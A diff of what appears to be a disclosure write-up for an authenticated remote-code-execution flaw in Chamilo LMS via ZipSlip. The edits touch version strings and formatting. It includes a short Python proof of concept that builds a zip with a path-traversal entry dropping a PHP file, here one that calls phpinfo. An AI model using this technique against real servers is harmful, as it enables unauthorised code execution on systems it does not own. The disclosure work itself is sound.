@@ -2,7 +2,7 @@
 
 Chamilo LMS Authenticated RCE via malicious zip file upload (ZipSlip)
 
-* Versions: Chamilo v1.11.*, Chamilo v1.10.* and earlier
+* Versions: Chamilo v1.11, Chamilo v1.10 and earlier
 * CVE: Awaiting Assignment
 * [Chamilo Issue Description and Resolution](https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues#Issue-94-2022-09-06-High-impact-Moderate-risk-Authenticated-RCE-via-zipslip-attack-in-file-upload)
 
@@ -25,16 +25,16 @@ There are two main steps for this exploit:
 
 First create a malicious zip file that will navigate two directories up using path transversal and place a PHP file with content you specify at this location.
 
-The below Python3 script will create a zip file to do this that calls `phpinfo` function:
+The below Python3 script will create a zip file called badzip.zip that calls `phpinfo()` when accessed:
 
-`
+```
 #!/usr/bin/python
 import zipfile
 z_info = zipfile.ZipInfo("../../info.php")
 z_file = zipfile.ZipFile("badzip.zip", mode="w")
 z_file.writestr(z_info, "<?php phpinfo();?>")
 z_file.close()
-`
+```
 
 The next steps differ depending on whether this is being done as a standard user or administrator (less steps).
 
